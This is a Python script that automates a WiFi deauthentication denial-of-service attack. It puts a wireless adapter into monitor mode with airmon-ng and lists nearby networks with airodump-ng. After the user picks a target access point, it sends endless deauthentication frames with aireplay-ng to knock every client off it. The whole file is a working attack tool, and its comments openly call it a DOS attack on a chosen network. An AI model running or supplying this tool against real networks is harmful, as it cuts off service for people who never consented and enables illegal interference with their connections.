from asyncio.subprocess import DEVNULL
import subprocess, os, re, csv, time

def command(cmd):
    return cmd.split(' ')

active_wireless_networks = []

def check_for_essid(essid, lst):

    if len(lst) == 0: return False 

    for item in lst:
        if essid in item["ESSID"]:
            return True

    return False 

run_as_root = 'SUDO_UID' in os.environ.keys()

if not run_as_root:
    print("[-] Error: You need to run as root.")
    exit()

nic_regex = re.compile("wlan[0-9]+")

scan_nic_command = subprocess.run(['ifconfig'], capture_output=True).stdout.decode()

scanned_nics = nic_regex.findall(scan_nic_command)

nics_found = len(scanned_nics) > 0

if not nics_found:
    print("[-] Error: No Wifi Adapters found.")
    exit()

print("The following WiFi adapters were found:")
for k, v in enumerate(scanned_nics):
    print(f"{k} - {v}")

while True:
    if len(scanned_nics) == 1:
        nic_index = 0 
        break
    nic_index = input("Select any of the following NICs: ")
    try:
        if scanned_nics[int(nic_index)]:
            break
    except:
        print("Please enter a number that corresponds with the choices available.")

hacknic = scanned_nics[int(nic_index)]

print(f"Killing intrusive system processes...")
subprocess.run(command("sudo airmon-ng check kill"), stdout=DEVNULL)

print(f"Putting {hacknic} into monitored mode:")
subprocess.run(command(f"sudo airmon-ng start {hacknic}"), stdout=DEVNULL)

subprocess.Popen(command(f"sudo airodump-ng -w file --write-interval 1 --output-format csv {hacknic}mon"), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

try:
    while True:
        subprocess.call("clear", shell=True)

        fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', \
            'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']

        with open('file-01.csv') as file:
            file.seek(0)

            csv_reader = csv.DictReader(file, fieldnames=fieldnames)
            for row in csv_reader:
                # We want to exclude the row with BSSID.
                if row["BSSID"] == "BSSID":
                    pass
                # We are not interested in the client data.
                elif row["BSSID"] == "Station MAC":
                    break
                # Every field where an ESSID is specified will be added to the list.
                elif not check_for_essid(row["ESSID"], active_wireless_networks):
                    active_wireless_networks.append(row)

        #print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(active_wireless_networks):
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        time.sleep(1)

except KeyboardInterrupt:
    print("\nReady to make choice.")
    if os.path.exists("file-01.csv"):
        os.remove("file-01.csv")

# Ensure that the input choice is valid.
while True:
    # If you don't make a choice from the options available in the list, 
    # you will be asked to please try again.
    choice = input("Please select a choice from above: ")
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print("Please try again.")

# To make it easier to work with and read the code, we assign the results to variables.
hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"].strip()

# Change to the channel we want to perform the DOS attack on. 
subprocess.run(command(f"airmon-ng start {hacknic}mon {hackchannel}"), stdout=DEVNULL)

try:
    subprocess.run(command(f"aireplay-ng --deauth 0 -a {hackbssid} {scanned_nics[int(nic_index)]}mon"))
except KeyboardInterrupt:
    print(f"\nAttack halted.\nResetting {hacknic} to managed mode...")
    subprocess.run(command(f"airmon-ng stop {hacknic}mon"), stdout=DEVNULL)
    print("Restarting NIC processes...")
    subprocess.run(command("sudo systemctl start wpa_supplicant NetworkManager"))
finally:
    print("Bye!")